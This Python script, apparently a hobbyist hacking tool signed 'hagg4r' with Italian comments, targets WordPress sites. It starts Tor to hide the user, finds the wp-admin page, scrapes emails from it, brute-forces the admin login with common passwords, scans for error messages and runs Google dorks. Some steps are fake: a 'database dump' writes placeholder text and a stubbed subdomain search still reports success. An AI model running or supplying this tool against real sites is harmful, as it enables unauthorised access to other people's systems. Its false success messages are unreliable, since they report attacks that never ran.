import os
import subprocess
import requests
import re
import time
import whois
from tqdm import tqdm
from bs4 import BeautifulSoup, Comment
from scapy.all import sr1, IP, ICMP
from socket import gethostbyname, gethostbyaddr
import json
from itertools import product
from string import ascii_letters, digits

def pulisci_schermo():
    """Pulisce lo schermo del terminale."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_ascii_art():
    """Mostra il disegno ASCII all'inizio dell'esecuzione"""
    print("""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣶⣾⣿⡉⢤⣍⡓⢶⣶⣦⣤⣉⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣷⡀⠙⣿⣷⣌⠻⣿⣿⣿⣶⣌⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠈⢿⣿⡆⠹⣿⣿⣿⣿⣷⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠹⣿⡄⢻⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⣿⣿⣷⣽⣷⢸⣿⡿⣿⡿⠿⠿⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠐⠾⢭⣭⡼⠟⠃⣤⡆⠘⢟⢺⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠛⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠉⠛⠛⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠛⠀⠀⠀
                
by hagg4r""")

def start_tor():
    """Avvia Tor in background e nasconde l'output."""
    print("Tor in avvio...")
    try:
        subprocess.Popen(['tor'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(10)  # Attende che Tor sia avviato
        print("Tor avviato correttamente.")
    except Exception as e:
        print(f"Errore durante l'avvio di Tor: {e}")

def find_admin_page(url):
    """Trova la pagina admin del sito web"""
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.get(f"http://{url}/wp-admin/", headers=headers, timeout=5)
        if response.status_code == 200:
            print("\nPagina Admin trovata!")
            print(f"URL: {response.url}")

            # Estrae le email e altre informazioni utili dalla pagina
            soup = BeautifulSoup(response.text, 'html.parser')
            emails = set(re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', response.text))
            print("\nEmail trovate:")
            for email in emails:
                print(email)

            # Scarica la pagina admin in un file HTML
            html_file_path = os.path.join(os.path.expanduser("~"), "Desktop", f"{url.replace('/', '')}_admin.html")
            with open(html_file_path, 'w') as file:
                file.write(response.text)
            print(f"Pagina admin salvata in {html_file_path}")

            # Simula il salvataggio del database in un file di testo
            save_database_to_txt(url)

            # Tentativo di brute force
            brute_force_admin(url)
        else:
            print("Pagina Admin non trovata.")
    except Exception as e:
        print(f"Errore durante la ricerca della pagina admin: {e}")

def save_database_to_txt(url):
    """Simula il salvataggio del database in un file di testo"""
    database_content = "Simulazione dei dati del database estratti."
    try:
        txt_file_path = os.path.join(os.path.expanduser("~"), "Desktop", f"{url.replace('/', '')}_database.txt")
        with open(txt_file_path, 'w') as file:
            file.write(database_content)
        print(f"\nDatabase salvato in {txt_file_path}")

        # Mostra il peso del file
        file_size = os.path.getsize(txt_file_path)
        print(f"Peso del file: {file_size} bytes")
    except Exception as e:
        print(f"Errore durante il salvataggio del database: {e}")

def brute_force_admin(url):
    """Esegue il brute force delle credenziali di accesso admin"""
    username = "admin"
    passwords = ['admin', 'password123', '123456', 'admin123']  # Esempi di password comuni
    headers = {"User-Agent": "Mozilla/5.0"}

    for password in passwords:
        response = requests.post(f"http://{url}/wp-login.php", data={'log': username, 'pwd': password}, headers=headers, timeout=10)
        if "dashboard" in response.url:
            print(f"Brute force riuscito con username: {username} e password: {password}")
            break
        else:
            print(f"Tentativo fallito con password: {password}")

def scan_for_errors(url):
    """Scansiona il sito web per errori e debolezze di sicurezza"""
    error_patterns = [
        "404 Not Found", "500 Internal Server Error", "403 Forbidden",
        "SQL syntax", "Error establishing a database connection", "PHP Warning"
    ]
    headers = {"User-Agent": "Mozilla/5.0"}
    
    try:
        response = requests.get(f"http://{url}", headers=headers, timeout=5)
        for pattern in error_patterns:
            if pattern in response.text:
                print(f"Errore trovato: {pattern}")
    except Exception as e:
        print(f"Errore durante la scansione: {e}")

def execute_google_dorks():
    """Esegue Google Dorks per scoprire vulnerabilità note o informazioni sensibili."""
    google_dorks = [
        'site:example.com intitle:index.of',
        'site:example.com inurl:wp-admin',
        'site:example.com "phpinfo.php"',
        'site:example.com "Welcome to Wordpress"',
        'site:example.com ext:sql | ext:db | ext:log'
    ]

    try:
        for dork in google_dorks:
            response = requests.get(f"https://www.google.com/search?q={dork}", timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            for link in soup.find_all('a'):
                url = link.get('href')
                if 'url?q=' in url and not url.startswith('/'):
                    print(f"Trovato risultato interessante con Google Dork: {url}")
    except Exception as e:
        print(f"Errore durante l'esecuzione di Google Dorks: {e}")

def hosthunter_search(url):
    """Esegue una ricerca HostHunter per trovare sottodomini e altre informazioni correlate."""
    print("Esecuzione di HostHunter...")
    try:
        # Esegui il comando di HostHunter (devi averlo installato e configurato)
        # subprocess.run(['hosthunter', '--target', url, '--output', f'{url}_subdomains.txt'])
        print(f"HostHunter ha finito di cercare i sottodomini per {url}")
    except Exception as e:
        print(f"Errore durante l'esecuzione di HostHunter: {e}")

def main():
    pulisci_schermo()
    display_ascii_art()
    start_tor()
    
    url = input("\nInserisci l'URL del sito web target: ")
    find_admin_page(url)
    scan_for_errors(url)
    execute_google_dorks()
    hosthunter_search(url)

if __name__ == "__main__":
    main()
